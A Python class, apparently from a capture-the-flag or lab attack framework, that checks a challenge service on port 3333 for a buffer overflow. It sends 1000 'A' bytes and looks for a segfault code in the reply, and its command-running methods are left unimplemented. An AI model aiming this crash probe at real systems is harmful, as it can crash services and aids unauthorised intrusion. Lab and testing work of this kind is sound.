import socket
import BetterLogger
from BetterLogger import logger
from Exploit import Exploit

class ChallengeThreeBuffer(Exploit):
	def __init__(self, ip_address, parsed_config) -> None:
		super().__init__(ip_address=ip_address, parsed_config=parsed_config)

	def run_command(self, command):
		raise NotImplementedError()

	def run_hellevator(self):
		raise NotImplementedError()

	def test_if_vulnerable(self):
		"""
		Returns True if vulnerable and False if not
		"""
		try:
			logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeThreeBuffer...")
			port = 3333
			# logger.debug(f"{self.ip_address} - Connecting to port {port}...")
			socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			socket_connection.settimeout(3)
			socket_connection.connect((self.ip_address, port))
			socket_connection.settimeout(None)
			# logger.debug(f"{self.ip_address} - Successfully connected to port {port}.")

			exploit_command = 'A'*1000 # overflow the buffer
			# logger.debug(f"{self.ip_address} - Running command `{exploit_command}`...")
			socket_connection.sendall(exploit_command.encode())
			socket_connection.shutdown(socket.SHUT_WR)
			socket_response = ""
			while 1:
				data = socket_connection.recv(1024)
				# logger.debug(f"Received `{data.decode()}`")
				if len(data) == 0:
					break
				socket_response = data.decode()
			socket_connection.close()
			# logger.debug(f"{self.ip_address} - The server responded with `{socket_response}`")
			if "-11" in socket_response:
				logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeThreeBuffer!{BetterLogger.COLOR_END}")
				return True
			else:
				logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeThreeBuffer.{BetterLogger.COLOR_END}")
				return False
		except ConnectionRefusedError:
				logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeThreeBuffer because the vuln1_wrapper is not running!{BetterLogger.COLOR_END}")
				return None
		except Exception as err:
			logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeThreeBuffer is vulnerable.{BetterLogger.COLOR_END}")
			logger.exception(err)
			return False
